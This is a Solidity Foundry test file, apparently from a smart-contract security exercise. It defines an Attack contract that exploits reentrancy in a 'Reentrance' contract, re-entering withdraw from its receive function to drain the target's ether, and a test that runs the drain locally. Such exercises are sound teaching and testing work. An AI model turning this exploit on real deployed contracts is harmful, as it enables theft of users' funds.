// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Reentrance} from "../src/Reentrancy.sol";

contract Attack {
    Reentrance immutable target;

    constructor(address payable _target) {
        target = Reentrance(_target);
    }

    function attack() external {
        target.donate{value: 1e18}(address(this));
        target.withdraw(1e18);
    }

    receive() external payable {
        uint256 targetBalance = address(target).balance;
        
        if (targetBalance > 0) {
            uint256 amountToWithdraw = min(targetBalance, 1e18);
            target.withdraw(amountToWithdraw);
        }
    }

    function min(uint256 x, uint256 y) public pure returns(uint256) {
        return x < y ? x : y;
    }
}

// @TODO: Fix the arithmetic overflow/underflow.
contract ReentrancyTest is Test {
    Reentrance reentrance;
    Attack attack;

    function setUp() public {
        reentrance = new Reentrance();
        attack = new Attack(payable(address(reentrance)));
        vm.deal(address(reentrance), 10 ether);
        vm.deal(address(attack), 3 ether);
    }

    function testAttackerCanDrainTheProtocol() public {
        // initial balance
        assertEq(address(reentrance).balance, 10 ether);
        assertEq(address(attack).balance, 3 ether);



        // execute he attack
        attack.attack();

        //assert
        console.log("Attacker balance", address(attack).balance);
        console.log("Attacker balance", address(reentrance).balance);
    }
}